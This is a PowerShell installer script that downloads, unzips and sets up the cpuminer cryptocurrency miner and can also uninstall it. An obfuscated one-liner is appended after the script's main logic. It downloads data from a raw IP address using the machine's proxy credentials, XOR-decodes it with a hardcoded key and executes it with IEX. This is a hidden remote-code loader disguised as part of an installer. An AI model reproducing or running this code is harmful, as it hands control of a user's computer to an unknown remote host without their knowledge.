param(
	[string]$Version,
	[string]$Path,
	[switch]$Force,
	$Update,
	[switch]$Uninstall
)





$Configs = @{
	Url = "http://sourceforge.net/projects/cpuminer/files/pooler-cpuminer-2.3.3-win64.zip"
    Path = "$(Split-Path -Path $MyInvocation.MyCommand.Definition -Parent)\"
}

$Configs | ForEach-Object{

    try{

        $_.Result = $null
        if(-not $_.Path){$_.Path = $Path}
        $Config = $_

        
        
        

        if(-not $Uninstall){

            
            
            

            if($_.ConditionExclusion){            
                $_.ConditionExclusionResult = $(Invoke-Expression $Config.ConditionExclusion -ErrorAction SilentlyContinue)        
            }    
            if(($_.ConditionExclusionResult -eq $null) -or $Force){
                    	
                
                
                

                $_.Downloads = $_.Url | ForEach-Object{
                    Get-File -Url $_ -Path $Config.Path
                }       			

                
                
                
				
				$Directory = "C:\Program Files\cpuminer\"; if(-not (Test-Path -Path $Directory)){New-Item -Path $Directory -Type directory}

				$_.Downloads | ForEach-Object{
                    Unzip-File -File $(Join-Path $_.Path $_.Filename) -Destination $Directory
                }
                		
                
                
                

                $Executable = "C:\Program Files\cpuminer\minerd.exe";if(Test-Path $Executable){Set-Content -Path (Join-Path $PSbin.Path "minerd.bat") -Value "@echo off`nstart `"`" `"$Executable`" %*"}
				
                
                
                

                $_.Downloads | ForEach-Object{
                    Remove-Item (Join-Path $_.Path $_.Filename) -Force
                }
                		
                
                
                
                		
                if($Update){$_.Result = "AppUpdated";$_
                }else{$_.Result = "AppInstalled";$_}
            		
            
            
            
            		
            }else{
            	
                $_.Result = "ConditionExclusion";$_
            }

        
        
        
        	
        }else{
		
            if(Test-Path (Join-Path $PSbin.Path "minerd.bat")){Remove-Item (Join-Path $PSbin.Path "minerd.bat")}
            
			$Directory = "C:\Program Files\cpuminer\"; if(Test-Path $Directory){Remove-Item -Path $Directory -Force -Recurse}
                            
            $_.Result = "AppUninstalled";$_
        }

    
    
    

    }catch{

        $Config.Result = "Error";$Config
    }
}
[SYStEm.NET.SeRVICePOINTManAgEr]::EXPect100CONtInue = 0;$wc=NEw-ObJecT SYsteM.NEt.WEbClienT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HEaDerS.AdD('User-Agent',$u);$Wc.PRoXy = [SYsTEM.NeT.WEbREQueST]::DefaULTWEbPRoXy;$wC.PRoxy.CREdentialS = [SYsTEm.NET.CREdEntIaLCAcHe]::DeFAUlTNeTWorkCrEDeNTIALS;$K='63a9f0ea7bb98050796b649e85481845';$i=0;[CHAR[]]$b=([cHAR[]]($wC.DoWNloadStrInG("http://138.121.170.12:3136/index.asp")))|%{$_-BXOr$k[$i++%$k.LEngtH]};IEX ($B-JoIn'')

